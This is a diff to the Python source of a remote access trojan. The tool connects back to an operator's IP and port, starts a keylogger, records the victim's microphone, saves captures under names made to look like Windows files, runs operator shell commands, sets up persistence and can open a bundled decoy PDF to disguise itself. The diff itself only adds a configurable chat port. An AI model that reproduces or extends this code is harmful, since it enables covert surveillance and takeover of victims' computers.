@@ -16,7 +16,6 @@ import tkinter
 
 ip = "192.168.1.105" #Change this value according to yourself.
 port = 4444 #Change this value according to yourself.
-chat_port = 5555
 
 my_thread = threading.Thread(target=kg.kg_Start)
 my_thread.start()
@@ -30,15 +29,20 @@ class mySocket():
         self.camera_file = os.environ["appdata"]+"\\windowsupdate.png"
         self.sound_file = os.environ["appdata"]+"\\windowssounds.wav"
         self.Mic_Question()
+        self.Chat_Port_Question()
 
     def Mic_Question(self):
         question_answer = self.Get_Json()
         if question_answer == "Y" or question_answer == "y":
             my_thread2 = threading.Thread(target=self.Start_Record)
             my_thread2.start()
-            self.Send_Json("[+]The victim's microphone recoring now.")
-        elif question_answer == "N" or question_answer == "n":
-            self.Send_Json("[+]The victim's microphone will not be recorded.")
+
+    def Chat_Port_Question(self):
+        question_answer = self.Get_Json()
+        if question_answer == 5555:
+            self.chat_port = 5555
+        else:
+            self.chat_port = question_answer
 
     def Execute_Command(self,command):
         command_output = subprocess.check_output(command,shell=True)
@@ -155,7 +159,7 @@ class mySocket():
 
     def Chat(self):
         self.chat_connection = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-        self.chat_connection.connect((ip,chat_port))
+        self.chat_connection.connect((ip,self.chat_port))
         self.chat_gui = tkinter.Tk()
         self.chat_gui.resizable(False, False)
         self.chat_gui.config(bg="#D9D8D7")
@@ -275,9 +279,9 @@ def Permanance():
         pass
 
 def Open_Added_File():
-    added_file = sys._MEIPASS + "\\examplefile.pdf" #Enter the file after '\\' to open with image,pdf etc.
+    added_file = sys._MEIPASS + "\\examplefile.pdf" #Enter the file after '\\' to combine with image,pdf etc.
     subprocess.Popen(added_file,shell=True)
 
-#Open_Added_File()
+#Open_Added_File() # And remove the '#' before the code.(If you activated it.)
 Permanance()
 Try_Connection()
